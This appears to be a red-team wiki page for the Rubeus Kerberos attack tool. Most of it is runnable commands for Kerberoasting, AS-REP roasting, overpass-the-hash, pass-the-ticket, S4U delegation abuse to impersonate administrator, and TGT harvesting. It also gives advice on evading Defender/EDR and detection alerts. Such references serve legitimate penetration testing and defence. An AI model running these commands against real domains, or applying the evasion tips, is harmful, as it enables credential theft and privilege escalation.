# Rubeus

**Tags:** `#rubeus` `#kerberos` `#activedirectory` `#kerberoasting` `#asreproasting` `#passtheticket` `#overpassthehash` `#s4u` `#auth`

GhostPack's C# Kerberos-abuse toolkit — the Windows counterpart to Impacket's Kerberos
scripts. Does the whole Kerberos attack surface from a **domain-joined Windows host in a
normal user context**: roasting, ticket requests (overpass-the-hash, PKINIT / shadow
credentials), pass-the-ticket, S4U delegation abuse, and ticket harvesting.

**Source:** https://github.com/GhostPack/Rubeus
**Install:** not on Kali — compile the C# (or use a precompiled `Rubeus.exe`) and run it on
a Windows target. The Linux equivalent is [[Tools/AD/impacket-kerberos-scripts|impacket's Kerberos scripts]].

> [!warning] **Signatured** — `Rubeus.exe` on disk is flagged by Defender/EDR; run it via
> an in-memory loader (`execute-assembly`, `Invoke-Rubeus`) or obfuscate. Most actions need
> no elevation (`kerberoast`, `asreproast`, `asktgt`, `tgtdeleg`); `dump`/`monitor`/`triage`
> across **all** logon sessions and `ptt` into another session need **local admin/SYSTEM**.

> [!note] **See also** — the full methodology behind these commands: [[Services/Active Directory/Kerberos|Kerberos]] (Kerberoast/AS-REP/overpass-the-hash/S4U/ticket forging). Also [[Services/Active Directory/ACL Abuse|ACL Abuse]] — consume a shadow-credential cert with `Rubeus.exe asktgt /certificate:...` and run targeted Kerberoasting after a `GenericWrite` SPN write. Linux counterpart: [[Tools/AD/impacket-kerberos-scripts|impacket Kerberos scripts]]; macOS counterpart: [[Tools/AD/Bifrost|Bifrost]].

---

## Enumerate Tickets

```
Rubeus.exe triage                 # table of all tickets (LUID / user / service) — admin sees all sessions
Rubeus.exe klist                  # tickets in the current logon session
Rubeus.exe dump /nowrap           # full ticket bytes (base64, admin) — /nowrap = no line wrapping for copy
Rubeus.exe dump /luid:0x3e7 /service:krbtgt /nowrap   # narrow the dump
```

`/nowrap` on any command that outputs a ticket/hash keeps it on one line for easy copy-paste.

---

## Roasting

```
:: Kerberoast — request TGS for accounts with an SPN, output crackable hashes
Rubeus.exe kerberoast /outfile:hashes.txt /nowrap
Rubeus.exe kerberoast /user:svc_sql /nowrap                :: one target
Rubeus.exe kerberoast /rc4opsec /nowrap                    :: only accounts that still allow RC4 (avoids AES noise/downgrade alerts)
Rubeus.exe kerberoast /stats                               :: recon: how many roastable accounts, which etypes

:: AS-REP roast — accounts with "Do not require Kerberos pre-auth"
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt /nowrap
```

Crack the output with [[Tools/Auth/hashcat|hashcat]] (`-m 13100` TGS-REP, `-m 18200` AS-REP)
or [[Tools/Auth/john the ripper|john]] (`--format=krb5tgs` / `krb5asrep`).

---

## Ticket Requests — OverPass-the-Hash & PKINIT

```
:: OverPass-the-Hash — turn an NTLM/AES key into a real TGT, inject with /ptt
Rubeus.exe asktgt /user:julio /rc4:64F12CDD... /ptt
Rubeus.exe asktgt /user:julio /aes256:<aeskey> /ptt        :: preferred — survives "RC4 disabled" hardening

:: PKINIT / Shadow Credentials — auth with a certificate (e.g. from ADCS or a msDS-KeyCredentialLink write)
Rubeus.exe asktgt /user:julio /certificate:cert.pfx /password:<pfxpw> /ptt

:: Get a usable TGT for the CURRENT user without elevation (abuses unconstrained-deleg GSS)
Rubeus.exe tgtdeleg /nowrap
```

---

## Pass-the-Ticket & Service Tickets

```
Rubeus.exe ptt /ticket:doIF...(base64)      :: inject a TGT/TGS into the current session
Rubeus.exe ptt /ticket:ticket.kirbi         :: from a file
Rubeus.exe asktgs /ticket:tgt.kirbi /service:cifs/dc01.corp.local /ptt   :: request a TGS from a TGT
Rubeus.exe renew /ticket:tgt.kirbi /ptt     :: renew a TGT before it expires
```

---

## S4U — Constrained / Resource-Based Delegation Abuse

```
:: Impersonate any user to a target SPN using a delegation-enabled account's key
Rubeus.exe s4u /user:websvc$ /rc4:<hash> /impersonateuser:administrator \
  /msdsspn:cifs/fileserver.corp.local /ptt

:: RBCD: after writing msDS-AllowedToActOnBehalfOfOtherIdentity, impersonate via the controlled machine acct
Rubeus.exe s4u /user:FAKE01$ /aes256:<key> /impersonateuser:administrator \
  /msdsspn:cifs/target.corp.local /ptt
```

Pairs with [[Tools/AD/rbcd|rbcd]] (writing the delegation attribute) — see also [[Services/Active Directory/ACL Abuse|ACL Abuse]].

---

## Harvest / Monitor / Utilities

```
Rubeus.exe monitor /interval:5 /nowrap        :: continuously harvest new TGTs (watch for logons / unconstrained deleg)
Rubeus.exe harvest /interval:30               :: harvest + auto-renew TGTs
Rubeus.exe createnetonly /program:cmd.exe     :: spawn a sacrificial logon session (safe place to ptt without clobbering yours)
Rubeus.exe hash /password:Passw0rd! /user:julio /domain:corp.local   :: compute RC4/AES keys from a password
```

---

## Quick Reference

| Goal | Command |
|---|---|
| List all tickets (admin) | `triage` / `dump /nowrap` |
| Kerberoast | `kerberoast /outfile: /nowrap` |
| AS-REP roast | `asreproast /format:hashcat /nowrap` |
| OverPass-the-Hash | `asktgt /user: /aes256: /ptt` |
| Cert / shadow-cred auth | `asktgt /certificate: /ptt` |
| TGT for current user, no admin | `tgtdeleg /nowrap` |
| Pass-the-Ticket | `ptt /ticket:` |
| Delegation abuse | `s4u /impersonateuser: /msdsspn: /ptt` |
| Safe session to inject into | `createnetonly /program:cmd.exe` |

---

*Created: 2026-07-13*
*Updated: 2026-09-28*
*Model: claude-opus-4-8*
